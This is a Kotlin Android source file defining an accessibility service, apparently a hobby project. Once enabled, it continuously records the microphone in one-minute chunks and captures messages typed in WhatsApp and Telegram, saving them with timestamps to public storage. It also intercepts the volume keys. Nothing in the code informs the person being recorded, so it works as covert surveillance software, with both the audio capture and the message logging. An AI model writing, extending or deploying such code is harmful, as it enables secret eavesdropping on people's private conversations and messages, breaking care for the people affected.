package com.example.accessibilityversion_2.services

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.Environment
import android.util.Log
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import android.widget.Toast
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*

class MyAccessibilityService : AccessibilityService() {

    private var previousMessage = "";
    private val TAG = "MyService"

    private lateinit var job: Job;
    private var mediaRecorder: MediaRecorder? = null;

    override fun onServiceConnected() {
        Log.e(TAG, "onServiceConnected: Accessibility Service is enabled")
        startAudioRecorder();
    }

    private fun startAudioRecorder() {
        Log.e(TAG, "startAudioRecorder: Audio started")
        mediaRecorder = MediaRecorder().apply {
            reset()
            setAudioSource(MediaRecorder.AudioSource.MIC);
            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            setOutputFile(getFilePath())
            setMaxDuration(60 * 1000)
            setOnInfoListener { mr, what, extra ->
                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                    Log.e(TAG, "startAudioRecorder: Audio Recorder Duration : 60s reached")
                    stopRecording();
                    startAudioRecorder();
                }
            }
            try {
                prepare()
                start();
            } catch (ex: Exception) {
                Log.e(TAG, "startAudioRecorder: Exception : ", ex)
                ex.printStackTrace();
            }
        }
    }


    private fun getFilePath(): String {
        var file =
            File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath,
                "My Audio Recorder"
            );
        if (!file.exists())
            if (!file.mkdirs())
                Log.e(TAG, "getFilePath: Failed to create Directory")

        var fileName = file.absolutePath;
        fileName += File.separator + "AUD${System.currentTimeMillis()}.amr"
        return fileName;
    }

    private fun stopRecording() {
        try {
            mediaRecorder?.let {
                it.stop();
                it.reset();
                it.release();
                Log.e(TAG, "stopRecording: Audio Recorder has stopped")
            }
            mediaRecorder = null;
        } catch (ex: Exception) {
            Log.e(TAG, "stopRecording: Exception has been thrown :", ex)
            ex.printStackTrace();
        }
    }


    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        Log.e(TAG, "onAccessibilityEvent:Without Filter : $event")
        if (checkingSocialMediaPackages(event) && event.className.equals("android.widget.EditText")) {
            if (event.text.size == 0) event.text.add("Message")
            val inputText = event.text[event.text.size - 1].toString();
            if ((inputText == "Сообщение" || inputText == "Message") && (previousMessage != "Сообщение" && previousMessage != "Message" && previousMessage.isNotEmpty())) {
                Log.e(TAG, "onAccessibilityEvent: You've send message : $previousMessage")
                val packageSplitted = event.packageName.split(".");
                var appName = packageSplitted[packageSplitted.size - 1];
                Log.e(TAG, "onAccessibilityEvent: App Name : $appName")
                if (appName.equals("messenger")) appName = "Telegram"
                savingMessagesWithAppName(previousMessage, appName);
                previousMessage = "";
            } else {
                previousMessage = inputText;
            }
        }
    }

    private fun checkingSocialMediaPackages(event: AccessibilityEvent): Boolean {
        val packageName = event.packageName;
        if (packageName == "com.whatsapp" || packageName == "org.telegram.messenger")
            return true;
        return false;
    }


    private fun savingMessagesWithAppName(message: String, appName: String) {
        job = CoroutineScope(Dispatchers.IO).launch {
            val file = creatingNewFileOrReturnOldOne(appName);
            Log.e(TAG, "savingMessagesWithAppName: ${file?.length()}")

            val fileWriter = FileWriter(file?.absolutePath, true);
            val formatter = SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
            val date = Date();
            fileWriter.write(
                "\n Сообщение: $message  Время: ${
                    formatter.format(
                        date
                    )
                }",
            )
            fileWriter.close();
        }
    }

    private fun creatingNewFileOrReturnOldOne(appName: String): File? {

        val file = File(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            "SentMessages"
        );

        if (!file.exists()) {
            if (!file.mkdirs()) {
                Log.e(TAG, "creatingNewFileOrReturnOldOne: Failed to create file directory")
                return null;
            }
        }

        return File(file.absolutePath + File.separator + appName + ".txt");
    }


    override fun onKeyEvent(event: KeyEvent): Boolean {
        val action = event.action;
        val code = event.keyCode;
        Log.e(TAG, "onKeyEvent: Action   : $action")
        Log.e(TAG, "onKeyEvent: Key_Code : $code")
        if (action == KeyEvent.ACTION_UP) {
            when (code) {
                KeyEvent.KEYCODE_VOLUME_DOWN -> {
                    volumeUpAndDown("DOWN")
                    Toast.makeText(
                        this,
                        "Уменшение грамкость ${getPercentageVolume()}",
                        Toast.LENGTH_SHORT
                    ).show()
                }
                KeyEvent.KEYCODE_VOLUME_UP -> {
                    volumeUpAndDown("UP");
                    Toast.makeText(
                        this,
                        "Увеличение грамкость ${getPercentageVolume()}",
                        Toast.LENGTH_SHORT
                    ).show()
                }
            }
        }
        return true;
    }

    private fun volumeUpAndDown(str: String) {
        val audioManager =
            applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager;
        if (str == "UP") {
            audioManager.adjustVolume(AudioManager.ADJUST_RAISE, AudioManager.FLAG_PLAY_SOUND);
        } else {
            audioManager.adjustVolume(AudioManager.ADJUST_LOWER, AudioManager.FLAG_PLAY_SOUND);
        }
    }

    private fun getPercentageVolume(): String {
        val audioManager =
            applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager;
        val currentVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        return "$currentVolume/$maxVolume";
    }

    override fun onInterrupt() {

    }

    override fun onDestroy() {
        super.onDestroy()
        if (this::job.isInitialized) job.cancel();
        stopRecording();
    }


}